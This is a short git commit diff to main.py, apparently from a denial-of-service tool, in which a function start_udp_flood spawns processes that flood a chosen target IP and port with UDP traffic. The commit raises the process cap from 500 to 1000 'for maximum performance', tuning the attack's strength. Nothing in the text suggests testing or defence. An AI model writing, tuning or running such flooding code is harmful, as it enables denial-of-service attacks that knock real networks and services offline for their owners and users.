65833381c341f7fcb05d3a7ae2aac5a709a5c0f2
KKRDP-01 <01sharm.ayt@gmail.com>
2024-11-28 10:53:58 +0530

    Update main.py

--- main.py
+++ main.py
@@ -72,8 +72,8 @@ def start_udp_flood(user_id, target_ip, target_port):
     stop_flag = multiprocessing.Event()
     processes = []
 
-    # Allow up to 500 CPU threads for maximum performance
-    for _ in range(min(500, multiprocessing.cpu_count())):
+    # Allow up to 1000 CPU threads for maximum performance
+    for _ in range(min(1000, multiprocessing.cpu_count())):
         process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
         process.start()
         processes.append(process)
